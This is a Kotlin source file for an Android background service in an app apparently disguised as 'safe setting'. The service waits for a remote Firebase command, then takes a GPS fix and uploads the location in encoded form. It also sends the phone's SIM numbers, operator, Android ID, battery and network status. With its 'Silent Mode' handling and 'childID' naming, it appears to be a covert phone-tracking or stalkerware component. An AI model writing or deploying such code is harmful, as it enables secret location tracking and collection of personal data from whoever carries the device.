package com.safe.setting.app.services.devicestatus

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.content.IntentFilter
import android.content.BroadcastReceiver
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.safe.setting.app.data.model.DeviceStatus
import com.safe.setting.app.data.preference.DataSharePreference.lastInternetOffTime
import com.safe.setting.app.services.base.BaseService
import com.safe.setting.app.utils.GzipUtils
import com.safe.setting.app.utils.GlobalConfig
import java.util.Date
import javax.inject.Inject
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class DeviceStatusService : BaseService(), InterfaceServiceDeviceStatus, LocationListener {

    @Inject
    lateinit var interactor: InterfaceInteractorDeviceStatus<InterfaceServiceDeviceStatus>

    private val handler = Handler(Looper.getMainLooper())
    private var statusRunnable: Runnable? = null
    private lateinit var locationManager: LocationManager
    private var batteryReceiver: BroadcastReceiver? = null

    override fun onCreate() {
        super.onCreate()
        interactor.onAttach(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Stop periodic location loop; switch to on-demand command listener
        try {
            listenForCommands()
        } catch (e: Exception) {
            // Fallback: still collect basic status once at start
            collectAndSendStatus()
        }
        // Register runtime battery receiver for precise percentage
        try { registerRuntimeBatteryReceiver() } catch (_: Exception) {}
        return START_STICKY
    }

    private fun registerRuntimeBatteryReceiver() {
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        batteryReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                try {
                    if (intent == null) return
                    val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                    val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                    val pct = if (level >= 0 && scale > 0) (level * 100) / scale else -1
                    val internetStatus = getInternetStatus()
                    val status = DeviceStatus(
                        batteryLevel = pct,
                        deviceModel = getDeviceModel(),
                        isInternetOn = internetStatus.first,
                        networkType = internetStatus.second,
                        androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID),
                        lastInternetOffTime = this@DeviceStatusService.lastInternetOffTime,
                        lastUpdated = Date().time,
                        simOperator = "",
                        sim1Number = "",
                        sim2Number = ""
                    )
                    updateUserDirectory(status)
                } catch (e: Exception) {
                    // ignore
                }
            }
        }
        registerReceiver(batteryReceiver, filter)
    }

    private fun listenForCommands() {
        val user = interactor.firebase().getUser() ?: return
        val childID = user.uid
        val ref = interactor.firebase().getDatabaseReference("config/$childID/command")
        ref.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val cmd = snapshot.getValue(String::class.java) ?: return
                if (cmd.equals("GET_LOCATION", ignoreCase = true)) {
                    if (GlobalConfig.isFrozen) {
                        // Silent Mode: ignore command and reset to avoid loops
                        try { interactor.firebase().getDatabaseReference("config/$childID/command").setValue("") } catch (_: Exception) {}
                        return
                    }
                    try {
                        fetchSingleLocation(childID)
                    } catch (e: Exception) {
                        interactor.firebase().getDatabaseReference("config/$childID/command").setValue("")
                    }
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    @SuppressLint("MissingPermission")
    private fun fetchSingleLocation(childID: String) {
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            // Request high accuracy if possible
            val provider = when {
                locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
                else -> LocationManager.NETWORK_PROVIDER
            }
            locationManager.requestSingleUpdate(provider, this, Looper.getMainLooper())
        } catch (e: Exception) {
            interactor.firebase().getDatabaseReference("config/$childID/command").setValue("")
        }
    }

    @SuppressLint("HardwareIds", "MissingPermission")
    private fun collectAndSendStatus() {
        val batteryLevel = getBatteryLevel()
        val deviceModel = getDeviceModel()
        val internetStatus = getInternetStatus()
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val simInfo = getSimInfo()

        // --- यह हिस्सा ठीक कर दिया गया है ---
        if (!internetStatus.first) {
            // सीधे कॉन्टेक्स्ट (this) का उपयोग करके वैरिएबल को सेट करें
            this.lastInternetOffTime = Date().time
        }

        val status = DeviceStatus(
            batteryLevel = batteryLevel,
            deviceModel = deviceModel,
            isInternetOn = internetStatus.first,
            networkType = internetStatus.second,
            androidId = androidId,
            // सीधे कॉन्टेक्स्ट (this) का उपयोग करके वैरिएबल को प्राप्त करें
            lastInternetOffTime = this.lastInternetOffTime,
            lastUpdated = Date().time,
            simOperator = simInfo.operator,
            sim1Number = simInfo.sim1,
            sim2Number = simInfo.sim2
        )
        // --- यहाँ तक बदलाव है ---
        interactor.sendDeviceStatus(status)
        // Also update User_Directory on app start/network/battery change hooks
        try {
            updateUserDirectory(status)
        } catch (_: Exception) {}
    }

    private fun updateUserDirectory(status: DeviceStatus) {
        val user = interactor.firebase().getUser() ?: return
        val childID = user.uid
        val data = mapOf(
            "name" to (user.displayName ?: "Unknown"),
            "batteryLevel" to status.batteryLevel,
            "isOnline" to status.isInternetOn,
            "lastSeen" to status.lastUpdated
        )
        interactor.firebase().getDatabaseReference("User_Directory/$childID").updateChildren(data)
    }

    private data class SimInfo(val operator: String, val sim1: String, val sim2: String)

    @SuppressLint("MissingPermission", "ObsoleteSdkInt")
    private fun getSimInfo(): SimInfo {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val operatorName = telephonyManager.simOperatorName ?: "No SIM"
        var sim1 = "N/A"
        var sim2 = "N/A"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            try {
                val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
                if (subscriptionInfoList != null) {
                    for (subscriptionInfo in subscriptionInfoList) {
                        val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            subscriptionManager.getPhoneNumber(subscriptionInfo.subscriptionId)
                        } else {
                            @Suppress("DEPRECATION")
                            subscriptionInfo.number
                        }

                        if (subscriptionInfo.simSlotIndex == 0) {
                            sim1 = number ?: "SIM 1 (Unknown)"
                        } else if (subscriptionInfo.simSlotIndex == 1) {
                            sim2 = number ?: "SIM 2 (Unknown)"
                        }
                    }
                }
            } catch (e: SecurityException) {
                sim1 = "Permission Denied"
                sim2 = "Permission Denied"
            }
        }
        return SimInfo(operatorName, sim1, sim2)
    }

    private fun getBatteryLevel(): Int {
        val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun getDeviceModel(): String {
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        return if (model.startsWith(manufacturer, ignoreCase = true)) model else "$manufacturer $model"
    }

    @SuppressLint("MissingPermission")
    private fun getInternetStatus(): Pair<Boolean, String> {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return Pair(false, "No Connection")
        val capabilities = cm.getNetworkCapabilities(network) ?: return Pair(false, "No Connection")

        return when {
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> Pair(true, "WIFI")
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val networkType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) tm.dataNetworkType else @Suppress("DEPRECATION") tm.networkType
                Pair(true, getNetworkClass(networkType))
            }
            else -> Pair(false, "No Connection")
        }
    }

    @Suppress("DEPRECATION")
    private fun getNetworkClass(networkType: Int): String {
        return when (networkType) {
            TelephonyManager.NETWORK_TYPE_GPRS, TelephonyManager.NETWORK_TYPE_EDGE, TelephonyManager.NETWORK_TYPE_CDMA,
            TelephonyManager.NETWORK_TYPE_1xRTT, TelephonyManager.NETWORK_TYPE_IDEN -> "2G"
            TelephonyManager.NETWORK_TYPE_UMTS, TelephonyManager.NETWORK_TYPE_EVDO_0, TelephonyManager.NETWORK_TYPE_EVDO_A,
            TelephonyManager.NETWORK_TYPE_HSDPA, TelephonyManager.NETWORK_TYPE_HSUPA, TelephonyManager.NETWORK_TYPE_HSPA,
            TelephonyManager.NETWORK_TYPE_EVDO_B, TelephonyManager.NETWORK_TYPE_EHRPD, TelephonyManager.NETWORK_TYPE_HSPAP -> "3G"
            TelephonyManager.NETWORK_TYPE_LTE -> "4G"
            TelephonyManager.NETWORK_TYPE_NR -> "5G"
            else -> "Unknown"
        }
    }

    override fun onDestroy() {
        statusRunnable?.let { handler.removeCallbacks(it) }
        try { unregisterReceiver(batteryReceiver) } catch (_: Exception) {}
        interactor.onDetach()
        super.onDestroy()
    }

    // LocationListener for single update
    override fun onLocationChanged(location: Location) {
        try {
            val user = interactor.firebase().getUser() ?: return
            val childID = user.uid
            val payload = "${location.latitude},${location.longitude}"
            val compressed = GzipUtils.compressToBase64(payload)
            interactor.firebase().getDatabaseReference("User_Directory/$childID/location").setValue(compressed)
            // Turn off GPS immediately by removing updates
            locationManager.removeUpdates(this)
            // Reset command
            interactor.firebase().getDatabaseReference("config/$childID/command").setValue("")
        } catch (e: Exception) {
            // Best-effort cleanup
            try { locationManager.removeUpdates(this) } catch (_: Exception) {}
        }
    }
    override fun onProviderEnabled(provider: String) {}
    override fun onProviderDisabled(provider: String) {}
}
